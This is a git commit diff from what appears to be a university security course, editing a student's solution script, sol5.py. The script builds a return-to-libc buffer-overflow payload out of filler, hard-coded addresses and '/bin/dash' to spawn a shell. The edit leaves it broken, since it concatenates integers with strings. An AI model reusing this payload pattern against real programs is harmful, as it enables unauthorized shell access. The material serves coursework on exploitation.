31904b2004827b0650d50142b137fa1d9d72f93d
marymx <marymx@umich.edu>
2022-03-28 21:31:57 +0000

    Automatic commit by test script for marymx yaoche

--- sol5.py
+++ sol5.py
@@ -1,9 +1,9 @@
 import sys
 filler = "D"*22
-addr = 0x0804ef50.to_bytes(4, "little")
+addr = 0x0804ef50
 
 dummy_ret = "f"*4
-arg = 0xbffefaa8.to_bytes(4, "little")
+arg = 0xbffefaa8
 
 command = "/bin/dash"
 sys.stdout.buffer.write(filler + addr + dummy_ret + arg + command)
